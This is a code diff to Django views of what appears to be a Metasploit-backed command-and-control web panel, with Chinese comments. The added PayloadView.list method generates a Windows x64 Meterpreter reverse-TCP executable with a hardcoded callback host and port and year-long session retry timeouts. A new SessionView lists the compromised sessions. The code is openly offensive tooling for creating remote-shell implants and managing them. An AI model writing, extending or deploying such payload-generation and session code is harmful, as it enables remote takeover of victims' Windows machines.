@@ -6,9 +6,18 @@ from Handle.handle import Handle
 from Handle.host import Host
 import json
 from Handle.payload import Payload
+from Handle.session import Session
 
 
 # Create your views here.
+class SessionView(BaseView):
+    def list(self, request, *args, **kwargs):
+        """
+        查看session信息
+        """
+        data = Session.list()
+        return Response(data=data, status=status.HTTP_200_OK)
+
 
 class HostView(BaseView):
     """
@@ -38,6 +47,15 @@ class PayloadView(BaseView):
     """
     生成payload
     """
+    def list(self, request, *args, **kwargs):
+        data = {'mname': 'windows/x64/meterpreter/reverse_tcp', 'opts': {'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp', 'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 2, 'EnableContextEncoding': False, 'ContextInformationFile': None, 'DisablePayloadHandler': False, 'ExitOnSession': False, 'ListenerTimeout': 0, 'LHOST': '172.16.171.129', 'LPORT': 1234, 'ReverseListenerBindAddress': '0.0.0.0', 'PayloadUUIDSeed': '0ba141fe-bd57-11ec-b10f-000c29b3f831', 'ReverseListenerBindPort': None, 'ReverseAllowProxy': False, 'ReverseListenerComm': None, 'ReverseListenerThreaded': False, 'StagerRetryCount': 10, 'StagerRetryWait': 5, 'PingbackRetries': 0, 'PingbackSleep': 30, 'PayloadUUIDRaw': None, 'PayloadUUIDName': None, 'PayloadUUIDTracking': False, 'EnableStageEncoding': False, 'StageEncoder': None, 'StageEncoderSaveRegisters': '', 'StageEncodingFallback': True, 'PrependMigrate': False, 'PrependMigrateProc': None, 'EXITFUNC': 'process', 'AutoLoadStdapi': True, 'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '', 'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None, 'SessionRetryTotal': 31536000, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 94608000, 'SessionCommunicationTimeout': 31536000, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False, 'MeterpreterDebugBuild': False, 'TARGET': 0, 'ID': 0, 'Format': 'exe'}}
+        mname = data.get("mname")
+        opts = data.get("opts")
+        if isinstance(opts, str):
+            opts = json.loads(opts)
+        response = Payload.create(mname, opts)
+        return response
+
     def create(self, request, *args, **kwargs):
         logger.info("前端传递数据为: {}".format(request.data))
         mname = request.data.get("mname")
